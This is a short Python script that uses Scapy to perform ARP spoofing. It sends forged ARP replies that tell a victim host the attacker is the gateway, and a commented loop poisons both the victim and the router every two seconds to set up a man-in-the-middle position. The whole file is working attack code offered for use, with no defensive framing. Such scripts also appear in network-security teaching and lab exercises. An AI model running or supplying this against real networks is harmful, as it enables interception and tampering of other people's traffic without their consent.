from scapy.all import *
import time
import sys

def get_mac(ip):
    # Scapy function to send an ARP request and get the MAC address
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    
    # op=2 means "ARP Reply" (is-at)
    # pdst = "Who am I talking to?" (The Victim)
    # hwdst = "Victim's MAC Address"
    # psrc = "Who am I pretending to be?" (The Router/Gateway)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    
    # send the packet (verbose=False hides the output)
    send(packet, verbose=False)

# USAGE EXAMPLE in a loop:
# target_ip = "192.168.1.5" (Victim)
# gateway_ip = "192.168.1.1" (Router)
# while True:
#     spoof(target_ip, gateway_ip)
#     spoof(gateway_ip, target_ip)
#     time.sleep(2)